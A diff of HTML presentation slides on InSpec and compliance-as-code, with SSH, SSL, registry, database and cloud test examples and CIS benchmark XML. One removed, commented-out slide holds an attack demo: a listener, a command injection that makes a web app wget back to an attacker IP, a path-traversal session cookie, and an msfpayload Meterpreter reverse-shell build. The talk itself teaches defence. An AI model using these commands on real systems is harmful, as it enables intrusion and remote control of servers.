@@ -80,215 +80,73 @@ Slide 1: Whatladf
       <div class="slides">
 
         <section data-background="intro.jpeg">
-          <h1 class="z blue lightbg">InSpec</h1>
-          <h3 class="z blue lightbg">forge compliance into automation</h3>
+          <h1 class="z blue lightbg">Compliance as Code</h1>
+          <h3 class="z blue lightbg">DevOps meets security</h3>
         </section>
 
-
-        <!--
-        Tell the personal story of how auditors came into our DevOps cloud
-        project 5 years ago.
-        * feeling: like a clash of worlds; going into a different country speaking a different language
-        * process: traditional workflow, traditional processes; didn't go well with our DevOps approach
-        * important:
-        * result: learnings
-        -->
-        <!-- <section data-background="power.plant.jpg">
-          <h2 class="lightbg">DevOps meets compliance</h2>
-          <p class="lightbg">anno 2011</p>
-        </section> -->
-<!--
         <section>
-          <h3 style="text-transform: lowercase;">$> whoami</h3>
+          <!-- <h3 style="text-transform: lowercase;">$> whoami</h3> -->
           <div >
             <p>Dominik Richter</p>
             <p style="font-size: smaller">Co-creator of InSpec and Chef Compliance</p>
             <p style="font-size: smaller">Product Manager at Chef</p>
             <ul class="vertical-list" style="font-size: smaller; text-align:center">
               <li>
-                <a href="https://twitter.com/arlimus"><i class="icon-twitter"></i>@arlimus</a> <a href="https://github.com/arlimus"><i class="icon-github-circled"></i>arlimus</a>
+                <a href="https://twitter.com/arlimus"><i class="icon-twitter"></i>arlimus</a> <a href="https://github.com/arlimus"><i class="icon-github-circled"></i>arlimus</a>
               </li>
             </ul>
           <div>
-        </section> -->
-
-        <!-- <section data-background="phone-old-year-built-1955-bakelite-163008.jpeg">
-          <h2 class="z gray lightbg">Background in TelCos</h2>
-        </section> -->
-
-        <section>
-          <h3>The Chef universe</h3>
-          <img src="chef.universe.png" alt="The Chef Universe" width="80%">
         </section>
 
         <section>
-          <ul class="block-list">
-            <li><span class="z blue">What is InSpec?</span></li>
-            <li class="fragment"><span class="z gray">Compliance profiles</span></li>
-            <li class="fragment"><span class="z gray">Continuous Compliance</span></li>
+          <h2>Traditional communication</h2>
+          <ul>
+            <li>Silos between Dev, Sec, and Ops</li>
+            <li>Regular meetings are not enough</li>
+          </ul>
+        </section>
+        <!--
+        * started first DevOps story in TelCo space years ago
+        * traditional businesses are culturally Silo'd
+          . regular meetings vs collaboration and sharing based on common problems
+          . especially in a space of heated discussions and regular escalations
+        -->
+
+        <section>
+          <h3>Approach: System hardening automation</h3>
+          <img src="devsec.io.png" alt="DevSec IO">
+          <p><a href="http://dev-sec.io" target="_blank">dev-sec.io</a></p>
+        </section>
+        <!--
+        * Development of the hardening project; dev-sec.io
+          . foundation for shared infrastructure automation that solves common security issues
+          -->
+
+        <section>
+          <h3>We had it all backwards</h3>
+          <ul>
+            <li>Fantastic for DevOps to share knowledge</li>
+            <li>Auditors saw the automation as implementation details</li>
+            <li>Problem #1: Learn all automation stacks?</li>
+            <li>Problem #2: Proof is still needed</li>
+            <li>Problem #3: Express and share compliance context</li>
           </ul>
         </section>
 
-				<!--
-        <section>
-          <h2>Cycle of regulation</h2>
-          <img src="regulation.loop.png" alt="Regulation Loop"/>
-        </section>
-
-        <section>
-          <h2>Compliance and security</h2>
-          <img src="compliance-v-security.png" alt="Compliance v Security" style="width: 50%"/>
-        </section>
-
-        <section>
-          <p>Offer baseline security and isolation layers</p>
-          <pre>
-            <code class="hljs bash wrap">
-# let's try some wget
-nc -l 8888
-
-curl 'http://192.168.1.2/expenses.php?ccc=wget%20http%3A%2F%2F192.168.1.10%3A8888' --cookie 'PHPSESSID=31468g1scu79qbp0lcjp85aj82; path=/; user=../../../../../../../../var/lib/php/session/sess_31468g1scu79qbp0lcjp85aj82%00'
-
-msfpayload linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=5555 X > met
-
-# copy met to /var/www and start apache
-...
-            </code>
-          </pre>
-        </section>
-        -->
-
-        <section data-background="power.plant.jpg">
-          <h2 class="z orange">DevOps Transformation</h2>
-        </section>
-
-        <section>
-          <h2>The promise of the coded business</h2>
-          <img src="codification.promises.png" alt="Codification promises" style="margin-top: -2rem;"/>
-        </section>
-
-        <section>
-          <h3>Step #1: Codify your tech</h3>
-          <pre>
-            <code class="hljs ruby">
-template '/etc/ssh/sshd_config' do
-  source 'opensshd.conf.erb'
-  mode '0600'
-  owner 'root'
-  group 'root'
-  variables(
-    mac: SshMac.get_macs(node),
-    kex: SshKex.get_kexs(node),
-    cipher: SshCipher.get_ciphers(node),
-    ...
-            </code>
-          </pre>
-        </section>
-
-				<section>
-					<h3>Why infrastructure testing?</h3>
-				</section>
-
-				<section data-background="nuclear.jpeg">
-					<h3 style="background: rgba(255,255,255,0.4);">Code breaks</h3>
-					<p style="background: rgba(0,0,0,0.3); color: white; font-size: smaller;">normal accident theory</p>
-				</section>
-
-				<section data-background="#fff">
-					<img src="dc.complexity.1.png" alt="DC complexity 1" style="box-shadow: none" />
-				</section>
-
-				<section data-background="#fff">
-					<img src="dc.complexity.2.png" alt="DC complexity 2" style="box-shadow: none" />
-				</section>
-
-				<section data-background="#fff">
-					<img src="dc.complexity.3.png" alt="DC complexity 3" style="box-shadow: none" />
-				</section>
-
-				<section>
-					<h3>Why infrastructure testing?</h3>
-					<h3 class="fragment">1. Reduce the number of defects</h3>
-					<h3 class="fragment">2. Security and Compliance testing</h3>
-				</section>
-
-        <section>
-          <h2>Regulatory compliance</h2>
-          <table class="equi3">
-            <tr><td>PCI-DSS</td> <td>Gramm-Leach-Bliley Act</td> <td>HIPAA</td></tr>
-            <tr><td>Dodd-Frank</td> <td>ISO</td> <td>Sarbanes-Oxley</td></tr>
-            <tr><td>HITECH</td> <td>Grundschutz</td> <td>European Central Bank Regulations</td></tr>
-          </table>
-        </section>
-
-        <section data-background="compliance.doc.png">
-          &nbsp;
-        </section>
-
-        <section data-background="writing.jpg">
-          &nbsp;
-          <ul class="fragment vertical-list" style="text-align: center; background: rgba(255,255,255,0.66); padding: 1em;">
-            <li >Processes</li>
-            <li class=fragment>Data storage / processing</li>
-            <li class=fragment>Configuration</li>
-            <li class=fragment>Vulnerability handling</li>
-          </ul>
+        <section data-background="#FFCC98">
+          <h1>InSpec</h1>
+          <h3>Shared language for Dev, Ops, and Sec</h3>
+          <p>Works with Chef, Puppet, Ansible, Docker, ...</p>
         </section>
 
         <!--
-  * how to adress compliance in an organization effectively + rapidly
-  * orgs struggle under the weight of technical debt
-  * demonstrate transformational change
-  * major gains via Compliance
-
-  Why Compliance?
-  * show statistics
-  * it's still a problem / not solved
-
-  Old workflow
-
-  Technical Debt
-  * config of old-school systems
-  * nw + hw + sw automation
-
-  Orgs Transformation
-  * need to demonstrate this transformation
-      -->
-
-      <!--
-      PART 1: LANGUAGE
-      ================
-      -->
-
-        <!--
-        Operating at velocity has benefits in addition to agile, scalable compliance.
-        The processes, culture and technology used for compliance at velocity also
-        give an enterprise a level of velocity, scale and consistency that lets it
-        compete in the digital age. We refer to such an enterprise as a “coded business”.
+        * How does it work?
+          . traditional: requirements in docs; add human processing; add spreadsheets; add expert tools; aggregate results; get an idea
+          . inspec: requirements in code; scale out; see continuous results
         -->
-        <section data-background="silos.jpg">
-          &nbsp;
-        </section>
 
         <section>
-          <h2>Security meets operations</h2>
-          <img src="compliance.users.png" alt="Compliance users"/>
-        </section>
-
-        <!-- <section data-background="compliance.doc.png">
-          &nbsp;
-        </section> -->
-
-        <section>
-          <img src="different.languages.png" alt="Different language"/>
-        </section>
-
-        <section>
-          <img src="bring.users.together.2.png" alt="Bringing users together"/>
-        </section>
-
-        <section>
-          <h3>Documentation</h3>
+          <h3>Example compliance requirement</h3>
           <quote>
             SSH supports two different protocol versions. The original version, SSHv1,
             was subject to a number of security issues. Please use SSHv2 instead to
@@ -297,17 +155,7 @@ template '/etc/ssh/sshd_config' do
         </section>
 
         <section>
-          <h3>Scripting tools</h3>
-          <pre>
-            <code class="hljs bash">
-> grep "^Protocol" /etc/ssh/sshd_config | sed 's/Protocol //'
-2
-            </code>
-          </pre>
-        </section>
-
-        <section>
-          <h3>Testing a requirement</h3>
+          <h3>Express this test in code</h3>
           <pre>
             <code class="hljs ruby">
 describe sshd_config do
@@ -317,12 +165,8 @@ end
           </pre>
         </section>
 
-				<section data-background="#FFCC98">
-					<h1>InSpec</h1>
-				</section>
-
         <section>
-          <h3>Compliance language</h3>
+          <h3>Express the compliance control in code</h3>
           <pre>
             <code class="hljs ruby">
 control 'ssh-1234' do
@@ -346,397 +190,86 @@ end
 				</section>
 
         <section>
-					<h3><img src="same.stack.png" style="height: 1em; margin: 0; margin-bottom: -0.1em;"> One language</h3>
-					<ul class="vertical-list">
-						<li>Linux<span class=fragment>, Windows</span><span class=fragment>, BSD, Solaris, AIX, ...</span></li>
-					</ul>
-				</section>
+          <h3>Implementation example (Chef)</h3>
+          <pre>
+            <code class="hljs ruby">
+template '/etc/ssh/sshd_config' do
+  source 'opensshd.conf.erb'
+  mode '0600'
+  owner 'root'
+  group 'root'
+  variables(
+    protocol: '2',
+    ...
+            </code>
+          </pre>
+        </section>
 
-				<section>
-					<h3>Windows</h3>
-					<pre>
-						<code class="hljs ruby">
-control 'windows-base-201' do
+        <section>
+          <h3>Example no.2: Do not use old SSL</h3>
+          <pre>
+            <code class="hljs ruby">
+describe ssl(port: 443).where { cipher =~ /SSL/ } do
+  it { should_not be_enabled }
+end
+            </code>
+          </pre>
+        </section>
+
+        <section>
+          <h3>Full compliance control</h3>
+          <pre>
+            <code class="hljs ruby">
+control 'ssl-test-01' do
+  title 'Disable SSL on port 443'
+  desc  'You should not run old versions of SSL anymore...'
+  ref   'Internal Compliance Rules, v1.0, 5.5.1'
   impact 1.0
-  title 'Strong Windows NTLMv2 Authentication Enabled; Weak LM Disabled'
-  desc '
-    @link: http://support.microsoft.com/en-us/kb/823659
-  '
-  describe registry_key('HKLM\System\CurrentControlSet\Control\Lsa') do
-    it { should exist }
-    its('LmCompatibilityLevel') { should eq 4 }
+
+  describe ssl(port: 443).where { cipher =~ /SSL/ } do
+    it { should_not be_enabled }
   end
 end
-						</code>
-					</pre>
-				</section>
-
-				<!-- <section data-transition="fade-out">
-					<h3>Tiny HowTo</h3>
-					<pre><code class="hljs bash">
-inspec
-					</code></pre>
-					<pre class=fragment><code class="hljs bash">
-Commands:
-	inspec archive PATH    # archive a profile to tar.gz (default) or zip
-	inspec check PATH      # verify all tests at the specified PATH
-	inspec detect          # detect the target OS
-	inspec exec PATHS      # run all test files at the specified PATH.
-	inspec help [COMMAND]  # Describe available commands or one specific command
-	inspec json PATH       # read all tests in PATH and generate a JSON summary
-	inspec shell           # open an interactive debugging shell
-	inspec version         # prints the version of this tool
-					</code></pre>
-				</section> -->
-
-				<section>
-					<h3><img src="same.stack.png" style="height: 1em; margin: 0; margin-bottom: -0.1em;"> One language</h3>
-					<ul class="vertical-list">
-						<li>Linux, Windows, BSD, Solaris, AIX, ...</li>
-						<li class=fragment>Bare-metal<span class=fragment>, VMs</span><span class=fragment>, Containers</span></li>
-					</ul>
-				</section>
-
-				<!-- <section data-transition="fade">
-					<h3>Tiny HowTo</h3>
-					<span>
-					<pre><code class="hljs bash">
-inspec exec test.rb
-					</code></pre>
-					<pre class=fragment><code class="hljs bash">
-.
-Finished in 0.00228 seconds (files took 1.95 seconds to load)
-1 example, 0 failures
-					</code></pre>
-				</section>
-				<section  data-transition="fade">
-					<h3>Tiny HowTo</h3>
-					<span>
-					<pre><code class="hljs bash">
-inspec exec test.rb
-					</code></pre>
-					<pre class=fragment><code class="hljs bash">
-inspec exec /path/to/profile
-					</code></pre>
-					<pre class=fragment><code class="hljs bash">
-inspec exec github.com/chef/some-profile.git
-					</code></pre>
-				</section> -->
-
-				<section data-transition="fade">
-					<h3>Test your local node</h3>
-          <img src="run-local.png" style="width: 80%; margin: 0;">
-					<pre><code class="hljs bash">
-inspec exec profile
-					</code></pre>
-					<p class=small>&nbsp;</p>
-				</section>
-
-				<section data-transition="fade">
-					<h3>Test remote via SSH</h3>
-          <img src="run-ssh.png" style="width: 80%; margin: 0;">
-					<pre><code class="hljs bash">
-inspec exec profile -i vagrant.key -t ssh://root@172.17.0.1:11022
-					</code></pre>
-				</section>
-
-				<section data-transition="fade">
-					<h3>Test remote via WinRM</h3>
-          <img src="run-winrm.png" style="width: 80%; margin: 0;">
-					<pre><code class="hljs bash">
-inspec exec profile -t winrm://Admin@192.168.1.2 --password super
-					</code></pre>
-				</section>
-
-				<section data-transition="fade-in">
-					<h3>Test Docker Container</h3>
-          <img src="run-docker.png" style="width: 80%; margin: 0;">
-					<pre><code class="hljs bash">
-inspec exec profile -t docker://3cc8837bb6a8
-					</code></pre>
-				</section>
-
-				<!-- <section>
-					<h3>Anatomy of a container test</h3>
-					<pre><code class="hljs ruby">
-describe package('wget') do
-  it { should be_installed }
-end
-describe file('/fetch-all.sh') do
-  it { should be_file }
-  its('owner') { should eq 'root' }
-  its('mode') { should eq 0640 }
-end
-					</code></pre>
-				</section>
-				<section>
-					<h3>Anatomy of a container test</h3>
-					<pre><code class="hljs bash">
-inspec exec dtest.rb -t docker://f02e                                                                                              x1 8h44m master[d140c6a]
-					</code></pre>
-					<pre class=fragment><code class="hljs bash">
-....
-Finished in 0.1537 seconds (files took 1.77 seconds to load)
-4 examples, 0 failures
-					</code></pre>
-				</section> -->
-
-				<section>
-					<h3><img src="same.stack.png" style="height: 1em; margin: 0; margin-bottom: -0.1em;"> One language</h3>
-					<ul class="vertical-list">
-						<li>Linux, Windows, BSD, Solaris, AIX, ...</li>
-						<li>Bare-metal, VMs, Containers</li>
-						<li class=fragment>Nodes<span class=fragment>, DBs, Endpoints</span><span class=fragment>, APIs (Azure, ...)</span></li>
-					</ul>
-				</section>
-
-				<section>
-					<h3>DB testing</h3>
-					<pre><code class="hljs ruby">
-describe mysql_session.query("SELECT user, host FROM mysql.user WHERE host = '%'") do
-  its(:stdout) { should be empty  }
-end
-					</code></pre>
-				</section>
-
-				<section>
-					<h3>Cloud testing</h3>
-					<pre><code class="hljs ruby">
-security_groups.each do |security_group|
-  describe security_group do
-    it { should_not have_inbound_rule().with_source('0.0.0.0/0') }
-  end
-end
-					</code></pre>
-</section>
-
-<section>
-  <ul class="block-list">
-    <li><span class="z gray">What is InSpec?</span></li>
-    <li><span class="z blue">Compliance profiles</span></li>
-    <li><span class="z gray">Continuous Compliance</span></li>
-  </ul>
-</section>
-
-        <section>
-					<h1>CIS and SCAP</h1>
-				</section>
-
-				<section>
-					<h3>Benchmark for Compliance</h3>
-					<ul class="vertical-list">
-						<li>Red Hat Enterprise Linux, Ubuntu, SUSE, Oracle Linux, ...</li>
-						<li class=fragment>Microsoft Windows 7, 8, Server 2008, 2012</li>
-						<li class=fragment>IBM AIX, HP-UX, VMware ESXi</li>
-						<li class=fragment>Oracle MySQL, Apache Tomcat, MS SQL Server, MS IIS</li>
-					</ul>
-				</section>
-
-				<section>
-					<h4>Written in XML</h4>
-					<pre style="font-size: small; margin: 0 auto;">
-						<code class="hljs xml">
-<definition class="compliance" id="oval:org.cisecurity.benchmarks.o_centos_centos:def:1190" version="1">
-  <metadata>
-    <title>Set SSH Protocol to 2</title>
-    <affected family="unix">
-      <product>CentOS Linux 6</product>
-    </affected>
-    <reference ref_id="xccdf_org.cisecurity.benchmarks_rule_6.2.1_Set_SSH_Protocol_to_2" ref_url="http://benchmarks.cisecurity.org" source="xccdf_org.cisecurity.benchmarks_benchmark_1.1.0.1_CIS_CentOS_Linux_6_Benchmark"/>
-    <description>Set SSH Protocol to 2</description>
-  </metadata>
-  <criteria operator="AND">
-    <criterion negate="false" test_ref="oval:org.cisecurity.benchmarks.o_centos_centos:tst:10191"/>
-  </criteria>
-</definition>
-
-<ind:textfilecontent54_test check="all" check_existence="at_least_one_exists" comment="Ensure 'Protocol' sshd config parameter equals 2 (string)" id="oval:org.cisecurity.benchmarks.o_centos_centos:tst:10191" version="1">
-  <ind:object object_ref="oval:org.cisecurity.benchmarks.o_centos_centos:obj:10193"/>
-  <ind:state state_ref="oval:org.cisecurity.benchmarks.o_centos_centos:ste:10084"/>
-</ind:textfilecontent54_test>
-
-<ind:textfilecontent54_object comment="Ensure 'Protocol' sshd config parameter equals 2 (string)" id="oval:org.cisecurity.benchmarks.o_centos_centos:obj:10193" version="1">
-  <ind:filepath>/etc/ssh/sshd_config</ind:filepath>
-  <ind:pattern operation="pattern match">^\s*Protocol\s+(\S+)\s*(?:#.*)?$</ind:pattern>
-  <ind:instance datatype="int" operation="equals">1</ind:instance>
-</ind:textfilecontent54_object>
-
-<ind:textfilecontent54_state comment="Ensure 'Protocol' sshd config parameter equals 2 (string)" id="oval:org.cisecurity.benchmarks.o_centos_centos:ste:10084" version="1">
-  <ind:subexpression datatype="string" operation="equals" var_ref="oval:org.cisecurity.benchmarks.o_centos_centos:var:1190"/>
-</ind:textfilecontent54_state>
-						</code>
-					</pre>
-					<span class="copyright">Source and Copyright: Center for Internet Security</span>
-				</section>
-
-				<section>
-					<h4>Converted to InSpec</h4>
-					<pre style="margin: 0 auto;">
-						<code class="hljs ruby">
-control "xccdf_org.cisecurity.benchmarks_rule_6.2.1_Set_SSH_Protocol_to_2" do
-  title "Set SSH Protocol to 2"
-  desc  "SSH supports two different and incompatible protocols: SSH1 and SSH2. SSH1 was the original protocol and was subject to security issues. SSH2 is more advanced and secure."
-  impact 1.0
-  describe file("/etc/ssh/sshd_config") do
-    its(:content) { should match /^\s*Protocol\s+(\S+)\s*(?:#.*)?$/ }
-  end
-  file("/etc/ssh/sshd_config").content.to_s.scan(/^\s*Protocol\s+(\S+)\s*(?:#.*)?$/).flatten.each do |entry|
-    describe entry do
-      it { should eq "2" }
-    end
-  end
-end
-
-</code>
-				</section>
-
-				<section>
-					<h4>Native InSpec</h4>
-					<pre style="margin: 0 auto;">
-						<code class="hljs ruby">
-control "xccdf_org.cisecurity.benchmarks_rule_6.2.1_Set_SSH_Protocol_to_2" do
-  title "Set SSH Protocol to 2"
-  desc  "SSH supports two different and incompatible protocols: SSH1 and SSH2. SSH1 was the original protocol and was subject to security issues. SSH2 is more advanced and secure."
-  impact 1.0
-  describe sshd_config do
-    its('Protocol') { should cmp 2 }
-  end
-end
-						</code>
-					</pre>
-</section>
-
-<section>
-  <h3><img src="same.stack.png" style="height: 1em; margin: 0; margin-bottom: -0.1em;"> Silo-breaking</h3>
-  <ul class="vertical-list">
-    <li class=fragment>Build foundation for communication</li>
-    <li class=fragment>Share knowledge and code</li>
-    <li class=fragment>Codify agreements</li>
-  </ul>
-</section>
-
-<section>
-          <h3>Profile foundation</h3>
-          <img src="inheritance1.png" alt="Base profile for inheritance" />
+            </code>
+          </pre>
         </section>
 
         <section>
-          <h3>Make adjustments</h3>
-          <img src="inheritance2.png" alt="Base profile inheritance" />
+          <p>
+            Traditional compliance acts as an interruption.<br>
+          </p>
+          <img src="old.workflow.png" alt="Development stopped by auditors" width="80%" />
+          <p style="font-size: small; line-height: 1.0;">(a.k.a. the clean desk day and collecting password stickies from trash)</p>
         </section>
-
-        <section>
-          <h3>Spread to other environments</h3>
-          <img src="inheritance3.png" alt="More inheritance" />
-        </section>
-
-        <!-- <section>
-          <h2>Habitat &amp; InSpec</h2>
-        </section>
-
-        <section>
-          <h3><img src="habitat-stack.png" style="height: 1.2em; margin: 0; margin-bottom: -0.1em;"> Habitat buildchain</h3>
-          <ul class="vertical-list">
-            <li class=fragment>Access to all components that define your app</li>
-            <li class=fragment>Expose vulnerabilities of included components</li>
-            <li class=fragment>Safety at buildtime; Insights before runtime</li>
-          </ul>
-        </section>
-
-        <section>
-          <h3><img src="habitat-runtime.png" style="height: 1.2em; margin: 0; margin-bottom: -0.1em;"> Habitat runtime</h3>
-          <ul class="vertical-list">
-            <li class=fragment>Provide insights into configuration of apps</li>
-            <li class=fragment>Expose configuration of running state</li>
-            <li class=fragment>Reduced attack surface; Focus on applications</li>
-          </ul>
-        </section> -->
-
         <!--
-        PART 2: WORKFLOW
-        ================
+        * Collaboration is key. Compliance as part of the product.
+          . worst-case: Auditors come in after time X; we prepare everything for that fated day
+          . best day to go through the trash and look for stickies with passwords
         -->
 
         <section>
-          <ul class="block-list">
-            <li><span class="z gray">What is InSpec?</span></li>
-            <li><span class="z gray">Compliance profiles</span></li>
-            <li><span class="z blue">Continuous compliance</span></li>
+          <p>Compliance as part of continuous development<br>Drive collaboration</p>
+          <img src="new.workflow.png" alt="Development stopped by auditors" width="80%" />
+        </section>
+
+        <section>
+          <h3>Continuous compliance</h3>
+          <ul>
+            <li>Test early: During development,<br>use test-frameworks to fail quickly</li>
+            <li>Test continuously: With CI/CD<br>to fail in your pipeline, not production</li>
+            <li>Monitor production</li>
           </ul>
         </section>
 
-				<section>
-          <h2>Create new artifacts</h2>
-          <img src="old.workflow.1.png" alt="New artifact development flow" />
-        </section>
-
         <section>
-          <h2>To reach production</h2>
-          <img src="old.workflow.png" alt="Development stopped by auditors" />
-        </section>
-
-        <!-- <section>
-          <img src="compliance.v.velocity.1.png" alt="Compliance v Velocity 1" width="70%" />
-        </section>
-
-        <section>
-          <img src="compliance.v.velocity.4.png" alt="Compliance v Velocity 4" width="90%" />
-        </section> -->
-
-        <!-- <section>
-          <h2>Competitive Advantage</h2>
-          <img src="high.velocity.competitive.advantage.png" alt="Competitive Advantage" />
-          <h6>Book: The High Velocity Edge - Steven J. Spears</h6>
-        </section> -->
-
-        <section>
-          <h2>Continuous workflow</h2>
-        </section>
-
-        <!-- <section>
-          <img src="compliance.workflow.png" alt="Compliance Workflow"/>
-        </section>
-
-        <section>
-          <h2>Create and test early on</h2>
-        </section> -->
-
-        <!-- <section data-background="ssh-profile.png">
-          &nbsp;
-        </section> -->
-
-        <section data-background="compliance-kitchen-test.png">
-          <h2 class="z red">Create and test early on</h2>
-          <!-- &nbsp; -->
-        </section>
-
-        <section data-background="delivery.integration.1.png">
-          <h2 class="z red">Test continuously</h2>
-          <!-- &nbsp; -->
-        </section>
-
-        <section data-background="automate.compliance.overview.png">
-          <h2 class="z red">Deploy, Operate, Verify</h2>
-        </section>
-
-        <section>
-          <h2>Continuous workflow</h2>
-          <img src="compliance.workflow.png" alt="Compliance Workflow"/>
-        </section>
-
-        <section>
-          <h2 class="z blue">Safety at Velocity</h2>
-          <ul class="vertical-list">
-            <li class=fragment>Risk reduction when constantly changing your systems</li>
-            <li class=fragment>As part of the workflow. Not after, not later.</li>
-            <li class=fragment>Test for quality, Test for compliance</li>
+          <h3>Successful compliance automation</h3>
+          <ul>
+            <li>Pick a tool that is understood by everyone involved</li>
+            <li>Provide access to fail fast, fail small</li>
+            <li>Open opportunities to collaborate</li>
+            <li>Automate everything you can</li>
           </ul>
         </section>
-
-        <!-- <section>
-          <h2>Fixing The Compliance Cycle</h2>
-          <img src="compliance_cycle.png" alt="Fixing the compliance cycle" />
-        </section> -->
 
         <section>
           <img src="work.together.png" alt="work together" />
@@ -750,10 +283,14 @@ end
           <h6><a href="http://inspec.io" target="_blank">inspec.io</a></h6>
           <h6><a href="https://github.com/chef/inspec" style="font-size: smaller" target="_blank">github.com/chef/inspec</a></h6>
         </section>
+<!--
+        * Critical for adoption:
+          .
+          . access and opportunity to collaborate
+        -->
 
-        <section data-background="intro.jpeg">
-          &nbsp;
-        </section>
+
+
 
         <!-- <section>
           <h2 class="z gray">Where are we going?</h2>
